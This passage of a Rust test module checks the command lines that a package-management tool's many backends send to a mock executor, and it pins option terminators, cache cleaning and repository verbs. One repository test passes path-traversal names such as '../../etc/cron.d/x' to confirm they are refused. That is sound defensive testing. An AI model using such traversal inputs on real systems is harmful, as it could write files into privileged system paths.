            // each needs its own row: `npm install -g` / `pnpm add -g` / `yarn global add`.
            ArgvCase::pkg(
                "npm",
                &register_npm,
                Runs("npm install -g -- jq"),
                Runs("npm uninstall -g -- jq"),
            ),
            ArgvCase::pkg(
                "pnpm",
                &register_pnpm,
                Runs("pnpm add -g -- jq"),
                Runs("pnpm remove -g -- jq"),
            ),
            ArgvCase::pkg(
                "yarn",
                &register_yarn,
                Runs("yarn global add -- jq"),
                Runs("yarn global remove -- jq"),
            ),
            ArgvCase::pkg(
                "mise",
                &|r, e| crate::backends::mise::register(r, e, &Config::default()),
                Runs("mise use -g -- jq@latest"),
                Runs("mise uninstall -- jq"),
            ),
            // `go install` takes a module path, not a package name, and removal is deleting the
            // binary out of GOPATH/bin — so the only argv removal runs is the question of where
            // that is. Asserting a `go uninstall` would pin a verb the go tool does not have.
            ArgvCase::shaped(
                "go",
                &|r, e| crate::backends::go::register(r, e, &Config::default()),
                "github.com/mikefarah/yq/v4",
                &[],
                Runs("go install -- github.com/mikefarah/yq/v4@latest"),
                Runs("go env GOPATH"),
            ),
            ArgvCase::pkg(
                "pub",
                &register_pubdart,
                Runs("dart pub global activate -- jq"),
                Runs("dart pub global deactivate -- jq"),
            ),
            ArgvCase::pkg(
                "krew",
                &register_krew,
                Runs("kubectl krew install -- jq"),
                Runs("kubectl krew uninstall -- jq"),
            ),
            ArgvCase::pkg(
                "composer",
                &register_composer,
                Runs("composer global require"),
                Runs("global remove"),
            ),
            ArgvCase::pkg(
                "opam",
                &register_opam,
                Runs("opam install"),
                Runs("opam remove"),
            ),
            ArgvCase::pkg(
                "luarocks",
                &register_luarocks,
                Runs("luarocks install"),
                Runs("luarocks remove"),
            ),
            ArgvCase::pkg(
                "nimble",
                &register_nimble,
                Runs("nimble install"),
                Runs("nimble uninstall"),
            ),
            ArgvCase::pkg(
                "pixi",
                &register_pixi,
                Runs("pixi global install"),
                Runs("pixi global uninstall"),
            ),
            ArgvCase::pkg(
                "spack",
                &register_spack,
                Runs("spack install"),
                Runs("spack uninstall"),
            ),
            ArgvCase::pkg(
                "mix",
                &register_mix,
                Runs("mix archive.install"),
                Runs("mix archive.uninstall"),
            ),
            ArgvCase::pkg(
                "asdf",
                &register_asdf,
                Runs("asdf install"),
                Runs("asdf uninstall"),
            ),
            // helm installs from `@url=` and lists/removes by name. It was exempt from this
            // table while a row could only carry a package name — the exemption said the row
            // "would pass on the remove alone", which was true of the table's *shape*, not of
            // helm. A row that carries options covers it, and the exemption is retired.
            ArgvCase::shaped(
                "helm",
                &register_helm,
                "shall-probe",
                &[("url", "https://example.invalid/p.tgz")],
                Runs("helm plugin install -- https://example.invalid/p.tgz"),
                Runs("helm plugin uninstall -- shall-probe"),
            ),
            // The two Haskell managers, which have no uninstall verb at all.
            ArgvCase::pkg("cabal", &register_cabal, Runs("cabal install"), Unsupported),
            ArgvCase::pkg("stack", &register_stack, Runs("stack install"), Unsupported),
            // ---- Editor extension hosts.
            ArgvCase::pkg(
                "vscode",
                &|r, e| crate::backends::vscode::register(r, e, &Config::default()),
                Runs("code --force --install-extension jq"),
                Runs("code --uninstall-extension jq"),
            ),
            // Emacs is handed an Emacs Lisp form, not a subcommand — which is why
            // `argv_drift_tests` excuses it from the `--help` walk. The form's *shape* is still
            // argv and still drifts, so it is asserted here rather than nowhere.
            //
            // The form batches (`Q46`): `(dolist (p '(a b)) (package-install p))` rather than
            // one `(package-install 'a)` per Emacs launch, because each launch also paid for a
            // `package-refresh-contents`. What is pinned is that the *name reaches the form* —
            // this test caught the change when it was made, which is the whole point of it.
            ArgvCase::pkg(
                "emacs",
                &|r, e| crate::backends::emacs::register(r, e, &Config::default()),
                Runs("(dolist (p '(jq)) (package-install p))"),
                Runs("(package-delete p)"),
            ),
            // ---- Resource backends: the declaration is not a package name, and each addresses
            // its own kind of thing. These are the rows the old table's shape could not hold.
            ArgvCase::shaped(
                "lvm",
                &|r, e| crate::backends::storage::register(r, e, &Config::default()),
                "vg0/data",
                &[("size", "1G")],
                Runs("lvcreate -n data -L 1G vg0"),
                Runs("lvremove -y vg0/data"),
            ),
            ArgvCase::shaped(
                "zfs",
                &|r, e| crate::backends::storage::register(r, e, &Config::default()),
                "tank/data",
                &[],
                Runs("zfs create tank/data"),
                Runs("zfs destroy -r tank/data"),
            ),
            ArgvCase::shaped(
                "btrfs",
                &|r, e| crate::backends::btrfs::register(r, e, &Config::default()),
                "/mnt/shall-probe",
                &[],
                Runs("btrfs subvolume create /mnt/shall-probe"),
                NoCommand(
                    "deletion is guarded on the subvolume existing on the real filesystem \
                     (`Path::exists`), which no mock can satisfy. Deleting a path that is not \
                     there is the one case where running nothing is right.",
                ),
            ),
            // `service:` and `setting:` dispatch on which init system / settings store this
            // HOST has, not on which OS the code was compiled for — `sc` here, `systemctl`
            // there. So these two rows assert the provider this host selects, and each platform's
            // CI covers its own. Both backends additionally have provider-table tests that run
            // everywhere.
            ArgvCase::shaped(
                "service",
                &|r, e| crate::backends::service::register(r, e, &Config::default()),
                "nginx",
                &[("state", "running")],
                // **Three platforms, three init systems.** The backend detects which one is
                // driving the host — systemd, launchd, `sc` — so an `else` meaning "Linux" is a
                // guess that holds until somebody builds on a Mac. Nobody had: the matrix
                // produced one target out of four, and the first macOS run in this repo's
                // history reported `launchctl load -w nginx` against an expectation of
                // `systemctl`. The product was right; the test had two branches for three cases.
                Runs(if cfg!(windows) {
                    "sc start nginx"
                } else if cfg!(target_os = "macos") {
                    "launchctl"
                } else {
                    "systemctl"
                }),
                Runs(if cfg!(windows) {
                    "sc stop nginx"
                } else if cfg!(target_os = "macos") {
                    "launchctl"
                } else {
                    "systemctl"
                }),
            ),
            ArgvCase::shaped(
                "setting",
                &|r, e| crate::backends::setting::register(r, e, &Config::default()),
                if cfg!(windows) {
                    "Software\\ShallProbe/Value"
                } else {
                    "org.shall.probe/key"
                },
                &[("value", "1")],
                // **macOS has no settings store at all**, and this row is where that becomes a
                // stated fact rather than a surprise. `setting_stores.toml` ships `gsettings`
                // (`os = "linux"`) and the Windows registry, and nothing else — so on a Mac the
                // backend finds no adapter, refuses by name, and runs nothing. That is a real
                // gap in `setting:` coverage and not a defect in this test; recording it here
                // is how the gap stops being invisible.
                if cfg!(target_os = "macos") {
                    NoCommand(
                        "macOS ships no `[[setting_store]]` row — `setting_stores.toml` covers \
                         gsettings and the Windows registry — so the backend finds no adapter \
                         and refuses by name rather than running anything",
                    )
                } else {
                    Runs(if cfg!(windows) {
                        "reg add HKCU\\Software\\ShallProbe /v Value /d 1 /f"
                    } else {
                        "gsettings set org.shall.probe key 1"
                    })
                },
                if cfg!(target_os = "macos") {
                    NoCommand(
                        "the same, from the other side: with no adapter for this machine there \
                         is nothing to reset, and the removal refuses by name having run nothing",
                    )
                } else {
                    Runs(if cfg!(windows) {
                        "reg delete HKCU\\Software\\ShallProbe /v Value /f"
                    } else {
                        "gsettings reset org.shall.probe key"
                    })
                },
            ),
            // ---- Backends that run no command. Each fetches over HTTP or writes to the
            // filesystem directly, so "no argv" is the right answer and not a hole — but it is
            // asserted, because a download backend that started shelling out to `curl` would
            // otherwise change from "no calls" to "some calls" with nothing watching.
            ArgvCase::shaped(
                "link",
                &|r, e| crate::backends::link::register(r, e, &Config::default()),
                "/tmp/shall-probe-src",
                &[("target", "/tmp/shall-probe-dst")],
                NoCommand(
                    "writes a symlink (or copies) through the filesystem layer. It shells out \
                     for nothing, which is why a link works on a machine with no shell at all.",
                ),
                NoCommand("removes the file it wrote, through the same filesystem layer."),
            ),
            ArgvCase::shaped(
                "web",
                &|r, e| crate::backends::web::register(r, e, &Config::default()),
                "https://example.invalid/probe.tar.gz",
                &[("unverified", "true")],
                NoCommand(
                    "fetches over HTTP and writes the file itself. The scheme and checksum \
                     refusals happen before any process could be started.",
                ),
                NoCommand("deletes the file it downloaded; no process is involved."),
            ),
            ArgvCase::pkg(
                "github",
                &|r, e| crate::backends::github::register(r, e, &Config::default()),
                NoCommand(
                    "resolves a release through the GitHub API and downloads the asset over \
                     HTTP. Asset SELECTION is the thing worth pinning here and has its own \
                     tests and a recorded lock; no argv is involved in either half.",
                ),
                NoCommand("deletes the extracted artifact; no process is involved."),
            ),
            ArgvCase::shaped(
                "appimage",
                &|r, e| crate::backends::appimage::register(r, e, &Config::default()),
                "https://example.invalid/probe.AppImage",
                &[("unverified", "true")],
                NoCommand(
                    "downloads the image over HTTP and marks it executable through the \
                     filesystem layer — the same shape as `web`, one file format along.",
                ),
                NoCommand("deletes the image it downloaded; no process is involved."),
            ),
        ]
    }

    #[tokio::test]
    async fn every_backend_sends_the_argv_its_manager_expects() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        let mut unterminated: Vec<String> = Vec::new();
        let mut split_locks: Vec<String> = Vec::new();
        for case in argv_cases() {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let locks = Arc::new(DashMap::new());
            let exec = CommandExecutor::with_layer(true, false, mock.clone(), vfs, locks.clone());
            let mut reg = BackendRegistry::new();
            (case.register)(&mut reg, &exec);

            let name = case.backend;
            let b = reg
                .get(name)
                .unwrap_or_else(|| panic!("{name} did not register"));
            let inst = b
                .as_installable()
                .unwrap_or_else(|| panic!("{name} cannot install"));
            let spec = crate::core::PackageSpec {
                name: case.subject.into(),
                backend: name.into(),
                options: case
                    .options
                    .iter()
                    .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
                    .collect(),
                ..Default::default()
            };

            let installed = inst.install(&[spec], false).await;
            let after_install = mock.get_calls().await.len();
            let removed = inst
                .remove(
                    &[case.subject.to_string()],
                    false,
                    crate::app::sync::guard::Reaped::for_reason(
                        crate::app::sync::guard::GuardScope::Remove,
                        "a unit test of the effector itself",
                    ),
                )
                .await;
            let calls = mock.get_calls().await;

            check(
                name,
                "install",
                &case.install,
                installed,
                &calls[..after_install],
            );
            check(
                name,
                "remove",
                &case.remove,
                removed,
                &calls[after_install..],
            );
            unterminated.extend(operands_outside_the_terminator(&case, &calls));

            // One manager, one lock. The map is keyed by whatever each call asked to be
            // exclusive over, so more than one key here is a backend whose install and whose
            // removal do not wait for each other.
            let mut keys: Vec<String> = locks.iter().map(|e| e.key().clone()).collect();
            keys.sort();
            if keys.len() > 1 {
                split_locks.push(format!("{}: {:?}", case.backend, keys));
            }
        }

        assert!(
            split_locks.is_empty(),
            "these backends take a DIFFERENT exclusive lock to install than to remove, so two \
             Shall processes can write one package database at the same time:\n    {}\n\n\
             The lock names the manager, not the program: a manager that installs with one \
             binary and removes with another has one database and two names for it.",
            split_locks.join("\n    ")
        );

        assert!(
            unterminated.is_empty(),
            "these invocations hand a declaration's own text to a program that ends its options \
             at `--`, without sending one:\n    {}\n\n\
             `core::argv::push_names` is what puts the terminator in, and it is where the \
             answer for each program lives. A backend that builds argv by hand is a backend \
             that has to remember, and the two that did are the two root-privileged system \
             managers.",
            unterminated.join("\n    ")
        );
    }

    /// A backend whose operands cannot sit behind a terminator, and why.
    ///
    /// The reason is the exemption (E29). Both entries below are about the *shape* of the
    /// argument — a value belonging to a preceding flag is not an operand, and no `--` can
    /// precede it without becoming that flag's value instead.
    const NO_TERMINATOR: &[(&str, &str)] = &[(
        "emacs",
        "is handed one Emacs Lisp form as the value of `--eval`. A `--` in front of it would \
         become the form, and the package name is inside the form rather than beside it — \
         which is the same reason `argv_drift_tests` excuses emacs from the `--help` walk.",
    )];

    /// Operands this run sent to a terminating program with no terminator in front of them.
    ///
    /// **The argv table records what each backend runs; until now nothing asked `core::argv`
    /// whether it was right.** So `Runs("dnf install -y jq")` sat in a green test directly
    /// beside `Runs("apt install -y -- jq")`, and the two system managers that build argv by
    /// hand were the two that lost the hardening every backend on the data path gets for free.
    /// Checked against the calls, not against the expectation string, because the expectation
    /// is the thing that was wrong.
    fn operands_outside_the_terminator(case: &ArgvCase, calls: &[String]) -> Vec<String> {
        let mut out = Vec::new();
        for call in calls {
            let tokens: Vec<&str> = call.split_whitespace().collect();
            let Some((program, args)) = tokens.split_first() else {
                continue;
            };
            if !crate::core::argv::terminates_options(program) {
                continue;
            }
            // A terminator anywhere means the options ended; everything after it is an operand
            // by definition and needs nothing more.
            if args.contains(&"--") {
                continue;
            }
            // An operand is a token that is not itself an option and that carries the subject
            // the declaration named — `nixpkgs#jq` is the operand for a `jq` declaration.
            let carries_subject = args
                .iter()
                .any(|a| !a.starts_with('-') && a.contains(case.subject));
            if !carries_subject {
                continue;
            }
            if NO_TERMINATOR.iter().any(|(b, _)| *b == case.backend) {
                continue;
            }
            out.push(format!(
                "{}: `{}` — `{}` ends its options at `--`",
                case.backend, call, program
            ));
        }
        out
    }

    /// The terminator check, run against argv this test writes rather than argv the tree
    /// produces.
    ///
    /// **The gate above passes today, and that is exactly when an instrument stops being
    /// evidence.** It fired on `dnf install -y jq` and `pacman -S --noconfirm --needed jq` on
    /// the day it was written; nothing since then would notice if it quietly stopped seeing
    /// anything, because a scan that matches nothing and a tree with nothing to match look the
    /// same from the outside. So the shapes are asserted here — the two it must catch, and the
    /// four it must not — before it is trusted with the real table.
    #[test]
    fn the_terminator_check_can_actually_fail() {
        fn probe(backend: &'static str, subject: &'static str, call: &str) -> usize {
            let case = ArgvCase::shaped(
                backend,
                &|_, _| {},
                subject,
                &[],
                Expect::NoCommand("unused — this drives the scan, not a backend"),
                Expect::NoCommand("unused — this drives the scan, not a backend"),
            );
            operands_outside_the_terminator(&case, &[call.to_string()]).len()
        }

        // Caught: a terminating program handed the declaration's own text bare. These are the
        // two real invocations that were live when this was written.
        // `dnf` is no longer in the terminating set (it may be dnf5), so its bare operand is
        // correct and the scan must NOT flag it. `apt` is the terminating system manager this
        // half of the check still has to catch.
        assert_eq!(probe("dnf", "jq", "dnf install -y jq"), 0);
        assert_eq!(probe("apt-get", "jq", "apt-get install -y jq"), 1);
        assert_eq!(
            probe("pacman", "jq", "pacman -S --noconfirm --needed jq"),
            1
        );
        // And `winget`, which joined the terminating set on 2026-08-11 when the differential
        // probe measured it on windows-latest — it had been listed as not terminating on the
        // shape of its parser, and it was one of three rows that reasoning got wrong. It sat on
        // the "not caught" side of this self-test on the strength of that listing, which is the
        // instrument agreeing with the claim it was meant to check.
        assert_eq!(probe("winget", "jq", "winget install jq"), 1);

        // Not caught, and each for its own reason — a scan that flagged these would be turned
        // off within a week.
        assert_eq!(probe("apt", "jq", "apt install -y -- jq"), 0, "terminated");
        assert_eq!(
            probe("nix", "jq", "nix profile install -- nixpkgs#jq"),
            0,
            "terminated, and the operand only contains the subject"
        );
        assert_eq!(
            probe("scoop", "jq", "scoop install jq"),
            0,
            "scoop is a PowerShell script dispatching on $args[0]; a bare `--` becomes an app \
             name, so a bare operand is the correct argv and must not be flagged"
        );
        assert_eq!(
            probe("apt", "jq", "apt-get autoremove --dry-run"),
            0,
            "no operand carries the subject"
        );
        assert_eq!(
            probe("emacs", "jq", "emacs --batch --eval (package-install 'jq)"),
            0,
            "written exemption: the form is the value of `--eval`, not an operand"
        );
    }

    /// One verb's outcome against one expectation.
    ///
    /// Split out so `install` and `remove` cannot drift into two different standards — which is
    /// what happened the first time: removal asserted "ran nothing" for the unsupported case and
    /// install asserted nothing of the kind.
    fn check(
        backend: &str,
        verb: &str,
        expect: &Expect,
        outcome: crate::core::Result<()>,
        calls: &[String],
    ) {
        match expect {
            Expect::Runs(want) => {
                assert!(
                    calls.iter().any(|c| c.contains(want)),
                    "{backend}: {verb} ran no call containing `{want}`\n  calls: {calls:?}"
                );
            }
            Expect::Unsupported => {
                assert!(
                    matches!(outcome, Err(crate::core::Error::Unsupported(_))),
                    "{backend}: this manager has no {verb} verb, so it must refuse with \
                     Unsupported — it returned {:?}",
                    outcome.map(|()| "Ok")
                );
                assert!(
                    calls.is_empty(),
                    "{backend}: {verb} is unsupported and yet it ran something: {calls:?}"
                );
            }
            Expect::NoCommand(why) => {
                assert!(
                    calls.is_empty(),
                    "{backend}: {verb} is documented as running no command — \"{why}\" — and it \
                     ran {calls:?}. Either the backend grew a subprocess, in which case give it \
                     a `Runs` row, or the reason is now wrong."
                );
                assert!(
                    why.len() > 40,
                    "{backend}: {verb}'s no-command exemption has no reason worth the name"
                );
            }
        }
    }

    /// `shall clean-cache` reaches the managers that have one, and says nothing about the rest.
    ///
    /// **Three outcomes and no fourth**, the same discipline the argv table applies to install
    /// and remove — because the fourth, *"it reported success having run nothing"*, is exactly
    /// what forty backends did. `GenericUpgradable` had no `clean_cache` at all: every manager
    /// on the data path answered `Unsupported`, `handle_clean_cache` filtered that out
    /// silently, and a Debian machine with a full `/var/cache/apt/archives` was told **"No
    /// backend on this machine has a cache to clear."**
    ///
    /// The argv is pinned for the four system managers because a typo in a verb only
    /// `clean-cache` reaches is invisible on every platform that cannot run the manager — the
    /// whole reason the argv table exists.
    #[tokio::test]
    async fn cache_cleaning_runs_a_command_or_refuses_by_name() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        type Registrar = fn(&mut BackendRegistry, &CommandExecutor);
        // The rows whose argv is worth pinning by name: the system managers, whose cache is the
        // one that fills a disk, and the one that empties it with a different binary.
        let pinned: &[(&str, Registrar, &str)] = &[
            ("apt", register_apt, "apt-get clean"),
            ("dnf", register_dnf, "dnf clean all"),
            ("pacman", register_pacman, "pacman -Sc --noconfirm"),
            ("xbps", register_xbps, "xbps-remove -Oy"),
            ("zypper", register_zypper, "zypper clean --all"),
        ];
        for (name, register, want) in pinned {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let exec = CommandExecutor::with_layer(
                true,
                false,
                mock.clone(),
                vfs,
                Arc::new(DashMap::new()),
            );
            let mut reg = BackendRegistry::new();
            register(&mut reg, &exec);
            let up = reg
                .get(name)
                .and_then(|b| b.as_upgradable().cloned())
                .unwrap_or_else(|| panic!("{name} cannot upgrade"));
            up.clean_cache(false)
                .await
                .unwrap_or_else(|e| panic!("{name} has a cache verb and refused it: {e}"));
            let calls = mock.get_calls().await;
            assert!(
                calls.iter().any(|c| c.contains(want)),
                "{name}: cache cleaning ran no call containing `{want}` — it ran {calls:?}"
            );
        }

        // And the whole family: no backend may report success without running anything, and
        // none may run something and then report it has no cache.
        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        for case in argv_cases() {
            (case.register)(&mut reg, &exec);
        }
        let mut silent_success: Vec<String> = Vec::new();
        let mut ran_then_refused: Vec<String> = Vec::new();
        let mut cleaners: Vec<String> = Vec::new();
        for b in reg.all() {
            let Some(up) = b.as_upgradable() else {
                continue;
            };
            let before = mock.get_calls().await.len();
            let outcome = up.clean_cache(false).await;
            let after = mock.get_calls().await.len();
            let name = b.name().to_string();
            match (outcome, after > before) {
                (Ok(()), true) => cleaners.push(name),
                (Ok(()), false) => silent_success.push(name),
                (Err(crate::core::Error::Unsupported(_)), false) => {}
                (Err(_), true) => ran_then_refused.push(name),
                // A manager that ran its verb and the mock failed it, or refused for a reason
                // other than "no such verb" — both are the caller's to report, not this gate's.
                (Err(_), false) => {}
            }
        }
        assert!(
            silent_success.is_empty(),
            "these backends reported a cleared cache without running anything: {silent_success:?}"
        );
        assert!(
            ran_then_refused.is_empty(),
            "these backends ran a cache command and then reported failure: {ran_then_refused:?}"
        );
        assert!(
            cleaners.len() >= 15,
            "only {} backend(s) can clear a cache — the data path had none of them until \
             `clean_cache` became a row, and a low number here is that returning: {cleaners:?}",
            cleaners.len()
        );
    }

    /// A dependency probe sends its operand and keeps the manager's own format language.
    ///
    /// **`{name}` means two things and only one of them is a package.** dnf asks with
    /// `--queryformat %{name}`, which is rpm's format language — six characters that a
    /// substitute-everywhere fill would have turned into `%jq`, producing a listing of nothing
    /// under a command that exits 0. So the operand is the argument that *is* `{name}`, never
    /// one that contains it, and that is also what lets it go behind the terminator.
    ///
    /// Pinned for all three because they are the only rows in the tree that ask, and because
    /// `argv_drift_tests` does not drive `get_dependencies` — an argv only `shall info` reaches.
    #[tokio::test]
    async fn a_dependency_probe_sends_the_operand_and_keeps_the_format_string() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        // A backend, the function that builds it, and the argv it must send. Named because
        // spelling a function type inline three deep is what clippy calls complex and a reader
        // calls unreadable.
        type Registrar = fn(&mut BackendRegistry, &CommandExecutor);
        let want: &[(&str, Registrar, &str)] = &[
            (
                "dnf",
                register_dnf as Registrar,
                "dnf repoquery --requires --resolve --queryformat %{name} jq",
            ),
            ("pacman", register_pacman, "pacman -Si -- jq"),
            ("xbps", register_xbps, "xbps-query -x -- jq"),
        ];
        for (name, register, argv) in want {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let exec = CommandExecutor::with_layer(
                true,
                false,
                mock.clone(),
                vfs,
                Arc::new(DashMap::new()),
            );
            let mut reg = BackendRegistry::new();
            register(&mut reg, &exec);
            let mp = reg
                .get(name)
                .and_then(|b| b.as_metadata_provider().cloned())
                .unwrap_or_else(|| panic!("{name} reports no dependencies"));
            let _ = mp.get_dependencies("jq").await;
            assert_eq!(
                mock.get_calls().await,
                vec![argv.to_string()],
                "{name}'s dependency probe"
            );
        }
    }

    /// Adding a repository, removing one and listing them are three commands, and a row may
    /// name a different program for each.
    ///
    /// **The argv table drives `install` and `remove` and nothing else**, so a repository verb
    /// has never been in it — which is how apt spent months running `apt add-apt-repository`,
    /// a command apt refuses (`S44`). Converting `dnf` and `pacman` to rows put two more
    /// three-program managers on that path: dnf adds with its own plugin and removes a file
    /// with `rm`, and pacman writes both through `sh` and reads through `pacman-conf`. Each
    /// combination is asserted here, because "it compiled" says nothing about which program ran.
    #[tokio::test]
    async fn a_repository_verb_runs_the_program_that_verb_needs() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        type Registrar = fn(&mut BackendRegistry, &CommandExecutor);
        for (name, register) in [
            ("dnf", register_dnf as Registrar),
            ("pacman", register_pacman),
        ] {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let exec = CommandExecutor::with_layer(
                true,
                false,
                mock.clone(),
                vfs,
                Arc::new(DashMap::new()),
            );
            let mut reg = BackendRegistry::new();
            register(&mut reg, &exec);
            let rm = reg
                .get(name)
                .and_then(|b| b.as_repo_manager().cloned())
                .unwrap_or_else(|| panic!("{name} manages no repositories"));

            rm.add_repo("shallprobe", "https://example.invalid/r", false)
                .await
                .unwrap_or_else(|e| panic!("{name} add_repo: {e}"));
            rm.remove_repo(
                "shallprobe",
                false,
                crate::app::sync::guard::Reaped::for_reason(
                    crate::app::sync::guard::GuardScope::Remove,
                    "a unit test of the effector itself",
                ),
            )
            .await
            .unwrap_or_else(|e| panic!("{name} remove_repo: {e}"));
            let _ = rm.list_repos().await;

            let calls = mock.get_calls().await;
            let want: &[&str] = match name {
                "dnf" => &[
                    "dnf config-manager --add-repo https://example.invalid/r",
                    "rm -f /etc/yum.repos.d/shallprobe.repo",
                    "dnf repolist --all",
                ],
                _ => &[
                    "sh -c set -e; printf",
                    "sh -c rm -f '/etc/pacman.d/shall-shallprobe.conf'",
                    "pacman-conf --repo-list",
                ],
            };
            for w in want {
                assert!(
                    calls.iter().any(|c| c.contains(w)),
                    "{name}: no call contained `{w}` — it ran {calls:?}"
                );
            }
        }

        // The name lands in a path, so it is validated as a path segment — which is what both
        // hand-written modules did and the shared repo path did not, because until these two
        // became rows no row put a name in a path.
        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        register_dnf(&mut reg, &exec);
        let rm = reg.get("dnf").unwrap().as_repo_manager().unwrap().clone();
        for escape in ["../../etc/cron.d/x", "..", "", "a/b"] {
            assert!(
                rm.remove_repo(
                    escape,
                    false,
                    crate::app::sync::guard::Reaped::for_reason(
                        crate::app::sync::guard::GuardScope::Remove,
                        "a unit test of the effector itself"
                    )
                )
                .await
                .is_err(),
                "`{escape}` became part of `/etc/yum.repos.d/<name>.repo` unchallenged"
            );
        }
        assert!(
            mock.get_calls().await.is_empty(),
            "a refused repository name still ran something: {:?}",
            mock.get_calls().await
        );
        // The control: a real name still works, so this is not a check that refuses everything.
        rm.remove_repo(
            "epel",
            false,
            crate::app::sync::guard::Reaped::for_reason(
                crate::app::sync::guard::GuardScope::Remove,
                "a unit test of the effector itself",
            ),
        )
        .await
        .expect("a plain name");
    }

    /// A pinned version rides where that manager puts it, and still behind the terminator.
    ///
    /// The argv table drives one declaration per backend and that declaration is unpinned, so
    /// the pinned shape has no row. `pubdart.rs` asserted it before it became data and this is
    /// that assertion, kept rather than lost with the module: `dart pub global activate --
    /// webdev 2.7.0` is a trailing positional, not `webdev@2.7.0`, and the two are one
    /// `VersionPin` variant apart.
    #[tokio::test]
    async fn a_trailing_positional_version_lands_after_the_name() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        register_pubdart(&mut reg, &exec);

        let inst = reg.get("pub").unwrap().as_installable().unwrap().clone();
        let mut spec = crate::core::PackageSpec {
            name: "webdev".into(),
            backend: "pub".into(),
            ..Default::default()
        };
        spec.options.set("version", "2.7.0");
        let _ = inst.install(&[spec], false).await;

        let calls = mock.get_calls().await;
        assert!(
            calls
                .iter()
                .any(|c| c.contains("dart pub global activate -- webdev 2.7.0")),
            "the pinned version did not land as a trailing positional: {calls:?}"
        );
    }

    /// Both sides of the rule, on the four backends that put a version after the name.
    ///
    /// **This is the assertion `pub` had and its three siblings did not.** `pub` was the only
    /// one of the family pinned end-to-end, and the other three were carrying a variant named
    /// after flags while emitting a bare operand — so `luarocks` and `mix` dropped the `--` on
    /// every pinned install and kept it on every unpinned one, invisibly, because the argv table
    /// only drives the unpinned shape (Q30). A test that pins one member of a family is a test
    /// that lets the other three drift.
    ///
    /// `gem` is here as the control that must NOT terminate, for two independent reasons: its
    /// version is a real option (`-v 1.6`), and RubyGems reads `--` as the start of build
    /// arguments on every verb. If this test only asserted the operand cases, emptying the
    /// terminator table would pass it.
    #[tokio::test]
    async fn a_version_after_the_name_keeps_the_terminator_unless_it_is_an_option() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        struct Case {
            register: fn(&mut BackendRegistry, &CommandExecutor),
            backend: &'static str,
            pkg: &'static str,
            version: &'static str,
            /// The argv fragment that must appear — terminator included, or deliberately not.
            expected: &'static str,
        }
        let cases = [
            // Operands, measured in the `tools` image 2026-08-04: the terminator survives.
            Case {
                register: register_luarocks,
                backend: "luarocks",
                pkg: "luafilesystem",
                version: "1.8.0",
                expected: "luarocks install -- luafilesystem 1.8.0",
            },
            Case {
                register: register_mix,
                backend: "mix",
                pkg: "phx_new",
                version: "1.6.16",
                expected: "mix archive.install hex --force -- phx_new 1.6.16",
            },
            Case {
                register: register_pubdart,
                backend: "pub",
                pkg: "webdev",
                version: "2.7.0",
                expected: "dart pub global activate -- webdev 2.7.0",
            },
            // An option after the name. Behind `--`, `-v` would be a gem.
            Case {
                register: register_gem,
                backend: "gem",
                pkg: "colorize",
                version: "1.1.0",
                expected: "gem install colorize -v 1.1.0",
            },
        ];

        for Case {
            register,
            backend,
            pkg,
            version,
            expected,
        } in cases
        {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let exec = CommandExecutor::with_layer(
                true,
                false,
                mock.clone(),
                vfs,
                Arc::new(DashMap::new()),
            );
            let mut reg = BackendRegistry::new();
            register(&mut reg, &exec);
            let inst = reg.get(backend).unwrap().as_installable().unwrap().clone();

            let mut spec = crate::core::PackageSpec {
                name: pkg.into(),
                backend: backend.into(),
                ..Default::default()
            };
            spec.options.set("version", version);
            let _ = inst.install(&[spec], false).await;

            let calls = mock.get_calls().await;
            assert!(
                calls.iter().any(|c| c.contains(expected)),
                "{backend} pinned to {version} should build `{expected}`, got {calls:?}"
            );
        }
    }

    /// asdf's fallback is an operand too, and used to be treated as a flag.
    ///
    /// The unpinned branch set "there is a trailing option" unconditionally, so `latest` — a
    /// bare word — suppressed the terminator by a rule meant for `-v`. asdf still gets no `--`,
    /// because the terminator table measured it (`No such plugin: --`); what changed is that the
    /// two layers now say so for two correct reasons instead of agreeing by luck.
    #[tokio::test]
    async fn a_required_version_fallback_is_an_operand_not_a_flag() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        register_asdf(&mut reg, &exec);
        let inst = reg.get("asdf").unwrap().as_installable().unwrap().clone();

        let _ = inst
            .install(
                &[crate::core::PackageSpec {
                    name: "nodejs".into(),
                    backend: "asdf".into(),
                    ..Default::default()
                }],
                false,
            )
            .await;

        let calls = mock.get_calls().await;
        assert!(
            calls.iter().any(|c| c == "asdf install nodejs latest"),
            "an unpinned asdf line must ask for `latest`, with no terminator: {calls:?}"
        );
    }

    /// Every manager the exit-policy table knows carries its policy into the registry.
    ///
    /// **An exit policy is not argv, so the argv table cannot see it.** Converting `cargo` and
    /// `pipx` from hand-written modules to data on 2026-08-04 dropped their `with_exit_policy`
